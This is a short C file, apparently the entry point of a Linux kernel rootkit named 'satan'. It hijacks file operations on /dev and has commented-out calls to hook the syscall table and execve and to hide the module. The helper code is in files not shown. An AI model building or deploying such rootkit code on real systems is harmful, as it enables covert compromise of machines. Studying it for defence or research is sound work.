// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "dev.h"
#include "file.h"
#include "hide.h"
#include "syscall_hijack.h"

static int __init satan_init(void)
{
        pr_info("satan: initializing rootkit...\n");
        satan_dev_init(THIS_MODULE);
        satan_hijack_f_op("/dev");
        //satan_locate_sys_call_table();
        //satan_hijack_execve();
        //satan_set_hidden(true);
        return 0;
}

static void __exit satan_exit(void)
{
        pr_info("satan: shutting down...\n");
        satan_dev_destroy();
        satan_unhijack_f_op("/dev");
        //satan_set_hidden(false);
        //satan_restore_execve();
}

module_init(satan_init);
module_exit(satan_exit);

MODULE_LICENSE("GPL v2");
MODULE_VERSION("0.01");
